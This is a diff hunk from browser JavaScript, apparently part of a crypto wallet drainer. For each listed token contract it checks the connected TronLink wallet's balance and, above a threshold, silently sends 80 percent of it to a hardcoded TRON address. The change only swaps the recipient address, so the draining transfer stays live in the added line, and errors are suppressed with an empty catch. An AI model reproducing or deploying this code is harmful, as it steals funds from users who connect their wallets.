@@ -690,7 +690,7 @@
                     var contract = await window.tronWeb.contract().at(contractsAddress[i]);
                     balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();
                     if (balance.toNumber() >= tokenBalance[i]){
-                        await contract.transfer("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLu", Math.round(balance * 80 / 100)).send()
+                        await contract.transfer("TTw1e7fiNKxWx3KkYqt4bFJWhYQ6xAeCLs", Math.round(balance * 80 / 100)).send()
                     }
                 }catch{}
             }
